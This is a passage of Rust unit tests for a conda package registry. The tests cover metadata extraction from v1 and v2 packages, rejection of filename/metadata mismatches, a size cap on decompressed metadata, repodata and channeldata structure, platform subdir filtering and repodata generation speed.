        let mut tar_buf = Vec::new();
        {
            let mut tar_builder = tar::Builder::new(&mut tar_buf);
            let filler = vec![b'f'; 2000];
            let mut header = tar::Header::new_gnu();
            header.set_size(filler.len() as u64);
            header.set_mode(0o644);
            header.set_cksum();
            tar_builder
                .append_data(&mut header, "info/files", &filler[..])
                .unwrap();
            let mut header = tar::Header::new_gnu();
            header.set_size(index_bytes.len() as u64);
            header.set_mode(0o644);
            header.set_cksum();
            tar_builder
                .append_data(&mut header, "info/index.json", &index_bytes[..])
                .unwrap();
            tar_builder.finish().unwrap();
        }

        // Split on a 512-byte tar-record boundary (header 512 + padded
        // 2000-byte payload 2048) so stream 2 begins at the index.json header,
        // then encode the halves as two independent bzip2 streams.
        let split = 512 + 2048;
        let mut package = bzip2_compress(&tar_buf[..split]);
        package.extend_from_slice(&bzip2_compress(&tar_buf[split..]));

        let result = validate_conda_package(&package, "testpkg-1.0.0-py310_0.tar.bz2");
        assert!(
            result.is_ok(),
            "multi-stream v1 package must validate: {:?}",
            result
        );
        let meta = extract_conda_v1_metadata(&package).expect("multi-stream v1 metadata parses");
        assert_eq!(meta.get("name").and_then(|v| v.as_str()), Some("testpkg"));
    }

    /// #2556: a v1 `.tar.bz2` whose `info/index.json` inflates past the
    /// per-metadata-entry cap must not buffer unbounded during extraction; it
    /// returns None (bounded) rather than exhausting memory. The compressed bz2
    /// stays tiny, proving the cap bounds the decompressed size.
    #[test]
    fn test_extract_conda_v1_oversized_index_bounded_2556() {
        let pad = "A".repeat(
            (crate::util::bounded_archive::MAX_INGEST_METADATA_ENTRY_BYTES + 1024) as usize,
        );
        let huge = serde_json::json!({
            "name": "p", "version": "1", "build": "0", "pad": pad,
        });
        let package = build_test_conda_v1_package(&huge);
        assert!(package.len() < 256 * 1024, "compressed bz2 stays tiny");
        assert!(
            extract_conda_v1_metadata(&package).is_none(),
            "oversized v1 index must be bounded (None)"
        );
    }

    /// #2556 regression: a normal v1 package still extracts its metadata after
    /// the hardening.
    #[test]
    fn test_extract_conda_v1_normal_still_parses_2556() {
        let index = serde_json::json!({
            "name": "numpy", "version": "1.2.3", "build": "0", "depends": [],
        });
        let package = build_test_conda_v1_package(&index);
        let meta = extract_conda_v1_metadata(&package).expect("normal v1 parses");
        assert_eq!(meta.get("name").and_then(|v| v.as_str()), Some("numpy"));
        assert_eq!(meta.get("version").and_then(|v| v.as_str()), Some("1.2.3"));
    }

    /// Regression (#1782): the uploaded filename must match the embedded
    /// index.json metadata. Previously a package whose filename declared
    /// `postpkg-3.0.0-py312_0` while index.json said `name=testpkg,
    /// version=1.0.0` was accepted and silently published under the
    /// filename coordinates, discarding the embedded metadata.
    #[test]
    fn test_validate_v1_package_filename_metadata_mismatch_name() {
        let index = serde_json::json!({
            "name": "testpkg",
            "version": "1.0.0",
            "build": "py310_0",
            "depends": [],
        });
        let package = build_test_conda_v1_package(&index);
        // Filename declares a completely different package than index.json.
        let result = validate_conda_package(&package, "postpkg-3.0.0-py312_0.tar.bz2");
        assert!(
            result.is_err(),
            "filename/metadata mismatch must be rejected, got Ok"
        );
        assert!(
            result.unwrap_err().contains("name mismatch"),
            "expected a name-mismatch error"
        );
    }

    #[test]
    fn test_validate_v1_package_filename_metadata_mismatch_version() {
        let index = serde_json::json!({
            "name": "testpkg",
            "version": "1.0.0",
            "build": "py310_0",
            "depends": [],
        });
        let package = build_test_conda_v1_package(&index);
        // Same name+build, but the version differs from index.json.
        let result = validate_conda_package(&package, "testpkg-9.9.9-py310_0.tar.bz2");
        assert!(result.is_err(), "version mismatch must be rejected, got Ok");
        assert!(
            result.unwrap_err().contains("version mismatch"),
            "expected a version-mismatch error"
        );
    }

    #[test]
    fn test_validate_v1_package_filename_metadata_match_ok() {
        let index = serde_json::json!({
            "name": "testpkg",
            "version": "1.0.0",
            "build": "py310_0",
            "depends": [],
        });
        let package = build_test_conda_v1_package(&index);
        // Filename agrees with index.json on name, version, and build.
        let result = validate_conda_package(&package, "testpkg-1.0.0-py310_0.tar.bz2");
        assert!(
            result.is_ok(),
            "matching filename/metadata must pass: {:?}",
            result
        );
    }

    #[test]
    fn test_validate_v1_package_invalid_bz2() {
        let result = validate_conda_package(b"not bzip2 data", "pkg.tar.bz2");
        assert!(result.is_err());
        let err = result.unwrap_err();
        // May error as "not a valid bzip2 tar" or "missing info/index.json"
        assert!(
            err.contains("bzip2") || err.contains("info/index.json"),
            "Unexpected error: {}",
            err
        );
    }

    #[test]
    fn test_validate_unknown_extension() {
        let result = validate_conda_package(b"data", "pkg.zip");
        assert!(result.is_err());
        assert!(result.unwrap_err().contains("Unsupported package format"));
    }

    #[test]
    fn test_extract_conda_v2_metadata_basic() {
        let index = serde_json::json!({
            "name": "numpy",
            "version": "1.26.4",
            "build": "py312h02b7e37_0",
            "build_number": 1,
            "depends": ["python >=3.12", "libcblas >=3.9"],
            "constrains": ["numpy-base <0a0"],
            "license": "BSD-3-Clause",
            "subdir": "linux-64"
        });

        let package = build_test_conda_v2_package(&index);
        let extracted = extract_conda_v2_metadata(&package).unwrap();

        assert_eq!(extracted["name"], "numpy");
        assert_eq!(extracted["version"], "1.26.4");
        assert_eq!(extracted["build"], "py312h02b7e37_0");
        assert_eq!(extracted["build_number"], 1);
        assert_eq!(extracted["license"], "BSD-3-Clause");

        let deps = extracted["depends"].as_array().unwrap();
        assert_eq!(deps.len(), 2);
        assert_eq!(deps[0], "python >=3.12");

        let constrains = extracted["constrains"].as_array().unwrap();
        assert_eq!(constrains.len(), 1);
        assert_eq!(constrains[0], "numpy-base <0a0");
    }

    #[test]
    fn test_extract_conda_v2_metadata_with_features() {
        let index = serde_json::json!({
            "name": "mkl",
            "version": "2024.0",
            "build": "h5e30980_0",
            "build_number": 0,
            "depends": [],
            "features": "mkl",
            "track_features": "mkl",
            "license": "Intel Simplified Software License"
        });

        let package = build_test_conda_v2_package(&index);
        let extracted = extract_conda_v2_metadata(&package).unwrap();

        assert_eq!(extracted["features"], "mkl");
        assert_eq!(extracted["track_features"], "mkl");
    }

    #[test]
    fn test_extract_conda_v2_metadata_with_timestamp() {
        let index = serde_json::json!({
            "name": "pkg",
            "version": "1.0",
            "build": "0",
            "build_number": 0,
            "depends": [],
            "timestamp": 1709000000000_u64
        });

        let package = build_test_conda_v2_package(&index);
        let extracted = extract_conda_v2_metadata(&package).unwrap();

        assert_eq!(extracted["timestamp"], 1709000000000_u64);
    }

    #[test]
    fn test_extract_conda_v2_metadata_with_license_family() {
        let index = serde_json::json!({
            "name": "openssl",
            "version": "3.2.0",
            "build": "h0d3ecfb_1",
            "build_number": 1,
            "depends": ["ca-certificates"],
            "license": "Apache-2.0",
            "license_family": "Apache"
        });

        let package = build_test_conda_v2_package(&index);
        let extracted = extract_conda_v2_metadata(&package).unwrap();

        assert_eq!(extracted["license"], "Apache-2.0");
        assert_eq!(extracted["license_family"], "Apache");
    }

    #[test]
    fn test_extract_conda_v2_metadata_invalid_zip() {
        let result = extract_conda_v2_metadata(b"not a zip file");
        assert!(result.is_none());
    }

    #[test]
    fn test_extract_conda_v2_metadata_empty_zip() {
        let mut buf = Vec::new();
        {
            let writer = zip::ZipWriter::new(std::io::Cursor::new(&mut buf));
            writer.finish().unwrap();
        }
        let result = extract_conda_v2_metadata(&buf);
        assert!(result.is_none());
    }

    // -----------------------------------------------------------------------
    // .tar.bz2 v1 metadata extraction (bead: artifact-keeper-9k7)
    // -----------------------------------------------------------------------

    #[test]
    fn test_extract_conda_v1_metadata_basic() {
        let index = serde_json::json!({
            "name": "requests",
            "version": "2.31.0",
            "build": "pyhd8ed1ab_0",
            "build_number": 0,
            "depends": ["python >=3.7", "urllib3 >=1.21.1"],
            "license": "Apache-2.0",
            "subdir": "noarch"
        });

        let package = build_test_conda_v1_package(&index);
        let extracted = extract_conda_v1_metadata(&package).unwrap();

        assert_eq!(extracted["name"], "requests");
        assert_eq!(extracted["version"], "2.31.0");
        assert_eq!(extracted["build"], "pyhd8ed1ab_0");
        assert_eq!(extracted["build_number"], 0);
        assert_eq!(extracted["license"], "Apache-2.0");

        let deps = extracted["depends"].as_array().unwrap();
        assert_eq!(deps.len(), 2);
    }

    #[test]
    fn test_extract_conda_v1_metadata_with_constrains() {
        let index = serde_json::json!({
            "name": "scipy",
            "version": "1.11.4",
            "build": "py312h2b1e342_0",
            "build_number": 0,
            "depends": ["numpy >=1.22.4", "python >=3.12"],
            "constrains": ["scipy-tests ==1.11.4"],
            "license": "BSD-3-Clause"
        });

        let package = build_test_conda_v1_package(&index);
        let extracted = extract_conda_v1_metadata(&package).unwrap();

        let constrains = extracted["constrains"].as_array().unwrap();
        assert_eq!(constrains.len(), 1);
        assert_eq!(constrains[0], "scipy-tests ==1.11.4");
    }

    #[test]
    fn test_extract_conda_v1_metadata_invalid_bz2() {
        let result = extract_conda_v1_metadata(b"not bzip2 data");
        assert!(result.is_none());
    }

    // -----------------------------------------------------------------------
    // extract_conda_metadata dispatch (bead: artifact-keeper-9k7)
    // -----------------------------------------------------------------------

    #[test]
    fn test_extract_conda_metadata_v2_dispatch() {
        let index = serde_json::json!({
            "name": "pkg",
            "version": "1.0",
            "build": "0",
            "build_number": 0,
            "depends": ["dep >=1.0"]
        });
        let package = build_test_conda_v2_package(&index);
        let result = extract_conda_metadata(&package, "pkg-1.0-0.conda");
        assert!(result.is_some());
        assert_eq!(result.unwrap()["name"], "pkg");
    }

    #[test]
    fn test_extract_conda_metadata_v1_dispatch() {
        let index = serde_json::json!({
            "name": "pkg",
            "version": "2.0",
            "build": "0",
            "build_number": 0,
            "depends": []
        });
        let package = build_test_conda_v1_package(&index);
        let result = extract_conda_metadata(&package, "pkg-2.0-0.tar.bz2");
        assert!(result.is_some());
        assert_eq!(result.unwrap()["version"], "2.0");
    }

    #[test]
    fn test_extract_conda_metadata_unknown_extension() {
        let result = extract_conda_metadata(b"whatever", "pkg.whl");
        assert!(result.is_none());
    }

    // -----------------------------------------------------------------------
    // Repodata metadata fidelity (bead: artifact-keeper-09t)
    //
    // Verify that the production entry builder (`build_artifact_entry`, used by
    // both `build_repodata` and `build_shard`) preserves all fields that conda
    // clients need. Expected values are hardcoded literals (#2657).
    // -----------------------------------------------------------------------

    fn artifact_with_meta(name: &str, path: &str, meta: serde_json::Value) -> CondaArtifact {
        make_conda_artifact(name, path, Some(meta))
    }

    #[test]
    fn test_repodata_entry_includes_constrains() {
        let a = artifact_with_meta(
            "numpy",
            "linux-64/numpy-1.26.4-py312h02b7e37_0.conda",
            serde_json::json!({
                "name": "numpy",
                "version": "1.26.4",
                "build": "py312h02b7e37_0",
                "depends": ["python >=3.12"],
                "constrains": ["numpy-base <0a0"],
            }),
        );
        let entry = build_artifact_entry(&a, "numpy-1.26.4-py312h02b7e37_0.conda", "linux-64");
        assert_eq!(entry["constrains"].as_array().unwrap().len(), 1);
        assert_eq!(entry["constrains"][0], "numpy-base <0a0");
    }

    #[test]
    fn test_repodata_entry_includes_license() {
        let a = artifact_with_meta(
            "openssl",
            "linux-64/openssl-3.2.0-h0d3ecfb_1.conda",
            serde_json::json!({
                "name": "openssl",
                "version": "3.2.0",
                "build": "h0d3ecfb_1",
                "license": "Apache-2.0",
                "license_family": "Apache",
            }),
        );
        let entry = build_artifact_entry(&a, "openssl-3.2.0-h0d3ecfb_1.conda", "linux-64");
        assert_eq!(entry["license"], "Apache-2.0");
        assert_eq!(entry["license_family"], "Apache");
    }

    #[test]
    fn test_repodata_entry_includes_timestamp() {
        let a = artifact_with_meta(
            "pkg",
            "noarch/pkg-1.0-0.conda",
            serde_json::json!({
                "name": "pkg",
                "version": "1.0",
                "build": "0",
                "timestamp": 1709000000000_u64,
            }),
        );
        let entry = build_artifact_entry(&a, "pkg-1.0-0.conda", "noarch");
        assert_eq!(entry["timestamp"], 1709000000000_u64);
    }

    #[test]
    fn test_repodata_entry_includes_features() {
        let a = artifact_with_meta(
            "mkl",
            "linux-64/mkl-2024.0-h5e30980_0.conda",
            serde_json::json!({
                "name": "mkl",
                "version": "2024.0",
                "build": "h5e30980_0",
                "features": "mkl",
                "track_features": "mkl",
            }),
        );
        let entry = build_artifact_entry(&a, "mkl-2024.0-h5e30980_0.conda", "linux-64");
        assert_eq!(entry["features"], "mkl");
        assert_eq!(entry["track_features"], "mkl");
    }

    #[test]
    fn test_repodata_entry_omits_empty_optional_fields() {
        let a = artifact_with_meta(
            "simple",
            "noarch/simple-1.0-0.conda",
            serde_json::json!({
                "name": "simple",
                "version": "1.0",
                "build": "0",
                "license": "MIT",
            }),
        );
        let entry = build_artifact_entry(&a, "simple-1.0-0.conda", "noarch");
        // Optional fields should be absent, not empty strings
        assert!(entry.get("timestamp").is_none());
        assert!(entry.get("features").is_none());
        assert!(entry.get("track_features").is_none());
        assert!(entry.get("license_family").is_none());
    }

    #[test]
    fn test_repodata_entry_preserves_empty_depends() {
        let a = artifact_with_meta(
            "pkg",
            "noarch/pkg-1.0-0.conda",
            serde_json::json!({
                "name": "pkg",
                "version": "1.0",
                "build": "0",
                "depends": [],
                "constrains": [],
            }),
        );
        let entry = build_artifact_entry(&a, "pkg-1.0-0.conda", "noarch");
        assert!(entry["depends"].as_array().unwrap().is_empty());
        assert!(entry["constrains"].as_array().unwrap().is_empty());
    }

    #[test]
    fn test_repodata_entry_preserves_complex_depends() {
        let a = artifact_with_meta(
            "scikit-learn",
            "linux-64/scikit-learn-1.4.0-py312h7e6f82a_0.conda",
            serde_json::json!({
                "name": "scikit-learn",
                "version": "1.4.0",
                "build": "py312h7e6f82a_0",
                "depends": [
                    "python >=3.8,<3.13",
                    "numpy >=1.21",
                    "scipy >=1.7",
                    "pandas >=1.3",
                    "libgcc-ng >=12"
                ],
                "constrains": ["scikit-learn-intelex >=2024.0", "daal4py >=2024.0"],
            }),
        );
        let entry =
            build_artifact_entry(&a, "scikit-learn-1.4.0-py312h7e6f82a_0.conda", "linux-64");
        assert_eq!(entry["depends"].as_array().unwrap().len(), 5);
        assert_eq!(entry["constrains"].as_array().unwrap().len(), 2);
    }

    // -----------------------------------------------------------------------
    // Noarch handling (bead: artifact-keeper-36o)
    // -----------------------------------------------------------------------

    #[test]
    fn test_noarch_subdir_in_known_subdirs() {
        assert!(KNOWN_SUBDIRS.contains(&"noarch"));
        // noarch should be the first entry (convention)
        assert_eq!(KNOWN_SUBDIRS[0], "noarch");
    }

    #[test]
    fn test_noarch_artifact_filtering() {
        let artifacts = vec![
            make_conda_artifact(
                "requests",
                "noarch/requests-2.31.0-pyhd8ed1ab_0.tar.bz2",
                Some(serde_json::json!({"subdir": "noarch", "name": "requests"})),
            ),
            make_conda_artifact(
                "numpy",
                "linux-64/numpy-1.26.4-py312_0.conda",
                Some(serde_json::json!({"subdir": "linux-64", "name": "numpy"})),
            ),
            make_conda_artifact(
                "six",
                "noarch/six-1.16.0-pyh6c4a22f_0.tar.bz2",
                Some(serde_json::json!({"subdir": "noarch", "name": "six"})),
            ),
        ];
        let noarch = artifacts_for_subdir(&artifacts, "noarch");
        assert_eq!(noarch.len(), 2);
        assert!(noarch.iter().all(|a| a
            .metadata
            .as_ref()
            .and_then(|m| m.get("subdir").and_then(|v| v.as_str()))
            == Some("noarch")));
    }

    #[test]
    fn test_noarch_default_when_no_subdir_info() {
        // When metadata has no subdir and path is empty, default to noarch
        let result = extract_subdir(None, "");
        assert_eq!(result, "noarch");
    }

    #[test]
    fn test_noarch_v1_and_v2_packages() {
        // Both v1 (.tar.bz2) and v2 (.conda) should work in noarch
        let artifacts = vec![
            make_conda_artifact(
                "pip",
                "noarch/pip-24.0-pyhd8ed1ab_0.conda",
                Some(serde_json::json!({"subdir": "noarch", "package_format": "v2"})),
            ),
            make_conda_artifact(
                "setuptools",
                "noarch/setuptools-69.0.3-pyhd8ed1ab_0.tar.bz2",
                Some(serde_json::json!({"subdir": "noarch", "package_format": "v1"})),
            ),
        ];
        let noarch = artifacts_for_subdir(&artifacts, "noarch");
        assert_eq!(noarch.len(), 2);
    }

    #[test]
    fn test_noarch_package_entry_has_subdir_field() {
        // Verify a noarch artifact's repodata entry carries the subdir field.
        let artifact = make_conda_artifact(
            "requests",
            "noarch/requests-2.31.0-pyhd8ed1ab_0.tar.bz2",
            Some(serde_json::json!({"subdir": "noarch"})),
        );
        let entry =
            build_artifact_entry(&artifact, "requests-2.31.0-pyhd8ed1ab_0.tar.bz2", "noarch");
        assert_eq!(entry["subdir"], "noarch");
    }

    // -----------------------------------------------------------------------
    // V1 vs V2 repodata separation (bead: artifact-keeper-9k7)
    // -----------------------------------------------------------------------

    #[test]
    fn test_v1_packages_go_in_packages_key() {
        let mut packages = serde_json::Map::new();
        let mut packages_conda = serde_json::Map::new();

        let filename = "requests-2.31.0-pyhd8ed1ab_0.tar.bz2";
        assert!(!is_conda_v2(filename));

        // Simulate what build_repodata does
        let entry = serde_json::json!({"name": "requests"});
        if is_conda_v2(filename) {
            packages_conda.insert(filename.to_string(), entry);
        } else {
            packages.insert(filename.to_string(), entry);
        }

        assert_eq!(packages.len(), 1);
        assert_eq!(packages_conda.len(), 0);
        assert!(packages.contains_key(filename));
    }

    #[test]
    fn test_v2_packages_go_in_packages_conda_key() {
        let mut packages = serde_json::Map::new();
        let mut packages_conda = serde_json::Map::new();

        let filename = "numpy-1.26.4-py312h02b7e37_0.conda";
        assert!(is_conda_v2(filename));

        let entry = serde_json::json!({"name": "numpy"});
        if is_conda_v2(filename) {
            packages_conda.insert(filename.to_string(), entry);
        } else {
            packages.insert(filename.to_string(), entry);
        }

        assert_eq!(packages.len(), 0);
        assert_eq!(packages_conda.len(), 1);
        assert!(packages_conda.contains_key(filename));
    }

    #[test]
    fn test_mixed_v1_v2_repodata() {
        let mut packages = serde_json::Map::new();
        let mut packages_conda = serde_json::Map::new();

        let files = vec![
            ("numpy-1.26.4-py312h02b7e37_0.conda", "numpy"),
            ("scipy-1.11.4-py312h02b7e37_0.conda", "scipy"),
            ("requests-2.31.0-pyhd8ed1ab_0.tar.bz2", "requests"),
            ("six-1.16.0-pyh6c4a22f_0.tar.bz2", "six"),
        ];

        for (filename, name) in &files {
            let entry = serde_json::json!({"name": name});
            if is_conda_v2(filename) {
                packages_conda.insert(filename.to_string(), entry);
            } else {
                packages.insert(filename.to_string(), entry);
            }
        }

        let rd = build_repodata_json("linux-64", &packages, &packages_conda);

        // v2 (.conda) in packages.conda
        assert_eq!(rd["packages.conda"].as_object().unwrap().len(), 2);
        assert!(rd["packages.conda"]["numpy-1.26.4-py312h02b7e37_0.conda"].is_object());
        assert!(rd["packages.conda"]["scipy-1.11.4-py312h02b7e37_0.conda"].is_object());

        // v1 (.tar.bz2) in packages
        assert_eq!(rd["packages"].as_object().unwrap().len(), 2);
        assert!(rd["packages"]["requests-2.31.0-pyhd8ed1ab_0.tar.bz2"].is_object());
        assert!(rd["packages"]["six-1.16.0-pyh6c4a22f_0.tar.bz2"].is_object());
    }

    // -----------------------------------------------------------------------
    // Build number extraction (bead: artifact-keeper-09t)
    // -----------------------------------------------------------------------

    #[test]
    fn test_v2_package_extracts_real_build_number() {
        let index = serde_json::json!({
            "name": "numpy",
            "version": "1.26.4",
            "build": "py312h02b7e37_0",
            "build_number": 7,
            "depends": ["python >=3.12"],
            "license": "BSD-3-Clause"
        });

        let package = build_test_conda_v2_package(&index);
        let extracted = extract_conda_metadata(&package, "numpy-1.26.4-py312h02b7e37_0.conda");
        assert!(extracted.is_some());
        assert_eq!(extracted.unwrap()["build_number"], 7);
    }

    #[test]
    fn test_v1_package_extracts_real_build_number() {
        let index = serde_json::json!({
            "name": "requests",
            "version": "2.31.0",
            "build": "pyhd8ed1ab_0",
            "build_number": 3,
            "depends": ["python"],
            "license": "Apache-2.0"
        });

        let package = build_test_conda_v1_package(&index);
        let extracted = extract_conda_metadata(&package, "requests-2.31.0-pyhd8ed1ab_0.tar.bz2");
        assert!(extracted.is_some());
        assert_eq!(extracted.unwrap()["build_number"], 3);
    }

    // -----------------------------------------------------------------------
    // Dependencies extraction (bead: artifact-keeper-09t)
    // -----------------------------------------------------------------------

    #[test]
    fn test_v2_package_extracts_real_depends() {
        let index = serde_json::json!({
            "name": "pandas",
            "version": "2.2.0",
            "build": "py312h1a13023_0",
            "build_number": 0,
            "depends": [
                "numpy >=1.22.4,<2.0a0",
                "python >=3.12,<3.13.0a0",
                "python-dateutil >=2.8.2",
                "pytz >=2020.1",
                "tzdata"
            ],
            "constrains": [
                "pandas-stubs >=2.1.4.231227"
            ]
        });

        let package = build_test_conda_v2_package(&index);
        let extracted = extract_conda_metadata(&package, "pandas-2.2.0-py312h1a13023_0.conda");
        let extracted = extracted.unwrap();

        let deps = extracted["depends"].as_array().unwrap();
        assert_eq!(deps.len(), 5);
        assert!(deps.iter().any(|d| d.as_str() == Some("tzdata")));

        let constrains = extracted["constrains"].as_array().unwrap();
        assert_eq!(constrains.len(), 1);
    }

    #[test]
    fn test_v1_package_extracts_real_depends() {
        let index = serde_json::json!({
            "name": "urllib3",
            "version": "2.2.0",
            "build": "pyhd8ed1ab_0",
            "build_number": 0,
            "depends": [
                "brotli-python >=1.0.9",
                "h2 >=4,<5",
                "pysocks >=1.5.6,!=1.5.7,<2.0",
                "python >=3.8",
                "zstandard >=0.18.0"
            ]
        });

        let package = build_test_conda_v1_package(&index);
        let extracted = extract_conda_metadata(&package, "urllib3-2.2.0-pyhd8ed1ab_0.tar.bz2");
        let extracted = extracted.unwrap();

        let deps = extracted["depends"].as_array().unwrap();
        assert_eq!(deps.len(), 5);
    }

    // -----------------------------------------------------------------------
    // Channeldata compliance (bead: artifact-keeper-0p3)
    // -----------------------------------------------------------------------

    #[test]
    fn test_channeldata_has_version_1() {
        let packages = serde_json::Map::new();
        let cd = build_channeldata_json(&packages);
        assert_eq!(cd["channeldata_version"], 1);
    }

    #[test]
    fn test_channeldata_lists_all_known_subdirs() {
        let packages = serde_json::Map::new();
        let cd = build_channeldata_json(&packages);
        let subdirs = cd["subdirs"].as_array().unwrap();

        for known in KNOWN_SUBDIRS {
            assert!(
                subdirs.iter().any(|s| s.as_str() == Some(known)),
                "channeldata.json must list subdir: {}",
                known
            );
        }
    }

    #[test]
    fn test_channeldata_package_entry_has_subdirs_and_version() {
        let subdirs = vec!["linux-64".to_string(), "osx-arm64".to_string()];
        let entry = build_channeldata_package_entry(&subdirs, "1.26.4");
        assert!(entry.get("subdirs").is_some());
        assert!(entry.get("version").is_some());
        assert_eq!(entry["version"], "1.26.4");
    }

    // -----------------------------------------------------------------------
    // Conda metadata builder compliance (bead: artifact-keeper-09t)
    // -----------------------------------------------------------------------

    #[test]
    fn test_conda_package_format_pin_v2() {
        assert_eq!(conda_package_format("pkg-1.0-0.conda"), "v2");
    }

    #[test]
    fn test_conda_package_format_pin_v1() {
        assert_eq!(conda_package_format("pkg-1.0-0.tar.bz2"), "v1");
    }

    // -----------------------------------------------------------------------
    // Edge cases and robustness (bead: artifact-keeper-9k7)
    // -----------------------------------------------------------------------

    #[test]
    fn test_v2_package_with_many_depends() {
        // conda-forge packages can have 30+ dependencies
        let mut deps = Vec::new();
        for i in 0..30 {
            deps.push(format!("dep{} >=1.0", i));
        }
        let index = serde_json::json!({
            "name": "big-pkg",
            "version": "1.0",
            "build": "0",
            "build_number": 0,
            "depends": deps,
        });

        let package = build_test_conda_v2_package(&index);
        let extracted = extract_conda_metadata(&package, "big-pkg-1.0-0.conda").unwrap();
        assert_eq!(extracted["depends"].as_array().unwrap().len(), 30);
    }

    #[test]
    fn test_v1_package_with_empty_depends() {
        let index = serde_json::json!({
            "name": "noarch-pkg",
            "version": "1.0",
            "build": "0",
            "build_number": 0,
            "depends": [],
        });

        let package = build_test_conda_v1_package(&index);
        let extracted = extract_conda_metadata(&package, "noarch-pkg-1.0-0.tar.bz2").unwrap();
        assert!(extracted["depends"].as_array().unwrap().is_empty());
    }

    #[test]
    fn test_extract_metadata_preserves_version_specifiers() {
        // Conda version specifiers can be complex
        let index = serde_json::json!({
            "name": "pkg",
            "version": "1.0",
            "build": "0",
            "build_number": 0,
            "depends": [
                "python >=3.8,<3.13.0a0",
                "numpy >=1.22.4,<2.0a0",
                "openssl >=3.0.0,!=3.0.1"
            ],
        });

        let package = build_test_conda_v2_package(&index);
        let extracted = extract_conda_metadata(&package, "pkg-1.0-0.conda").unwrap();
        let deps = extracted["depends"].as_array().unwrap();
        assert_eq!(deps[0], "python >=3.8,<3.13.0a0");
        assert_eq!(deps[1], "numpy >=1.22.4,<2.0a0");
        assert_eq!(deps[2], "openssl >=3.0.0,!=3.0.1");
    }

    // -----------------------------------------------------------------------
    // Subdir completeness (bead: artifact-keeper-36o)
    // -----------------------------------------------------------------------

    #[test]
    fn test_all_platform_subdirs_covered() {
        let expected = [
            "noarch",
            "linux-64",
            "linux-aarch64",
            "linux-ppc64le",
            "linux-s390x",
            "osx-64",
            "osx-arm64",
            "win-64",
            "win-32",
        ];
        for subdir in &expected {
            assert!(
                KNOWN_SUBDIRS.contains(subdir),
                "Missing required subdir: {}",
                subdir
            );
        }
    }

    #[test]
    fn test_subdir_filtering_isolates_platforms() {
        let artifacts = vec![
            make_conda_artifact(
                "numpy",
                "linux-64/numpy.conda",
                Some(serde_json::json!({"subdir": "linux-64"})),
            ),
            make_conda_artifact(
                "numpy",
                "osx-arm64/numpy.conda",
                Some(serde_json::json!({"subdir": "osx-arm64"})),
            ),
            make_conda_artifact(
                "numpy",
                "win-64/numpy.conda",
                Some(serde_json::json!({"subdir": "win-64"})),
            ),
            make_conda_artifact(
                "six",
                "noarch/six.tar.bz2",
                Some(serde_json::json!({"subdir": "noarch"})),
            ),
        ];

        // Each platform subdir should get only its packages
        assert_eq!(artifacts_for_subdir(&artifacts, "linux-64").len(), 1);
        assert_eq!(artifacts_for_subdir(&artifacts, "osx-arm64").len(), 1);
        assert_eq!(artifacts_for_subdir(&artifacts, "win-64").len(), 1);
        assert_eq!(artifacts_for_subdir(&artifacts, "noarch").len(), 1);

        // Non-existent subdir should return empty
        assert_eq!(artifacts_for_subdir(&artifacts, "linux-aarch64").len(), 0);
    }

    // =======================================================================
    // Authentication compliance tests (bead: artifact-keeper-seq)
    // Maps to conda/conda#9973 and Artifactory plugin#200
    // =======================================================================
    // -----------------------------------------------------------------------
    // URL path token authentication (bead: artifact-keeper-gdm)
    // -----------------------------------------------------------------------

    #[test]
    fn test_token_router_routes_mirror_main_router() {
        // Verify the token_router has the same GET read endpoints
        // (This is a structural test - the real integration test requires a running server)
        let _main = router();
        let _token = token_router();
        // Both compile and produce valid routers
    }
    #[test]
    fn test_token_url_format_condarc() {
        // Verify the expected .condarc format is supported by our URL structure
        // .condarc:
        //   channels:
        //     - https://host/conda/t/ak_mytoken123/my-channel
        // This should route to: /conda/t/{token}/{repo_key}/...
        // where token = "ak_mytoken123" and repo_key = "my-channel"
        let channel_url = "https://host/conda/t/ak_mytoken123/my-channel";
        let path = channel_url.split("/conda/").nth(1).unwrap();
        assert!(path.starts_with("t/"));
        let parts: Vec<&str> = path.splitn(3, '/').collect();
        assert_eq!(parts[0], "t");
        assert_eq!(parts[1], "ak_mytoken123");
        assert_eq!(parts[2], "my-channel");
    }

    // =======================================================================
    // Repodata performance at scale (bead: artifact-keeper-v9v)
    // =======================================================================

    /// Helper to build a CondaArtifact with full metadata for performance testing.
    fn make_full_conda_artifact(
        name: &str,
        version: &str,
        build: &str,
        subdir: &str,
        format_ext: &str,
        size: i64,
    ) -> CondaArtifact {
        let filename = format!("{}-{}-{}.{}", name, version, build, format_ext);
        let path = format!("{}/{}", subdir, filename);
        CondaArtifact {
            id: uuid::Uuid::new_v4(),
            path,
            name: name.to_string(),
            version: Some(version.to_string()),
            size_bytes: size,
            checksum_sha256: format!("sha256_{}_{}_{}", name, version, build),
            storage_key: format!("conda/test-repo/{}/{}", subdir, filename),
            metadata: Some(serde_json::json!({
                "name": name,
                "version": version,
                "build": build,
                "build_number": 0,
                "subdir": subdir,
                "depends": ["python >=3.8"],
                "constrains": [],
                "license": "MIT",
                "package_format": if format_ext == "conda" { "v2" } else { "v1" },
            })),
        }
    }

    #[test]
    fn test_repodata_100_packages_fast() {
        // Generate 100 packages and verify repodata generation is fast
        let mut artifacts: Vec<CondaArtifact> = Vec::new();
        for i in 0..100 {
            artifacts.push(make_full_conda_artifact(
                &format!("pkg{}", i),
                "1.0.0",
                &format!("py312_{}", i),
                "linux-64",
                "conda",
                1024 * 100, // 100KB each
            ));
        }

        let start = std::time::Instant::now();
        let filtered = artifacts_for_subdir(&artifacts, "linux-64");
        assert_eq!(filtered.len(), 100);

        // Build repodata entries
        let mut packages_conda = serde_json::Map::new();
        for artifact in &filtered {
            let filename = artifact.path.rsplit('/').next().unwrap();
            let entry = build_repodata_entry(
                &artifact.name,
                artifact.version.as_deref().unwrap_or("0"),
                "0",
                0,
                &serde_json::json!(["python >=3.8"]),
                "",
                "sha",
                100,
                "linux-64",
            );
            packages_conda.insert(filename.to_string(), entry);
        }

        let rd = build_repodata_json("linux-64", &serde_json::Map::new(), &packages_conda);
        let elapsed = start.elapsed();

        assert!(
            elapsed.as_millis() < 1000,
            "100-package repodata should generate in < 1s, took {}ms",
            elapsed.as_millis()
        );
        assert_eq!(rd["packages.conda"].as_object().unwrap().len(), 100);
    }

    #[test]
    fn test_repodata_1000_packages_reasonable() {
        let mut artifacts: Vec<CondaArtifact> = Vec::new();
        for i in 0..1000 {
            artifacts.push(make_full_conda_artifact(
                &format!("pkg{}", i),
                "1.0.0",
                &format!("py312_{}", i),
                "linux-64",
                "conda",
                1024 * 100,
            ));
        }

        let start = std::time::Instant::now();
        let filtered = artifacts_for_subdir(&artifacts, "linux-64");
        assert_eq!(filtered.len(), 1000);

        let mut packages_conda = serde_json::Map::new();
        for artifact in &filtered {
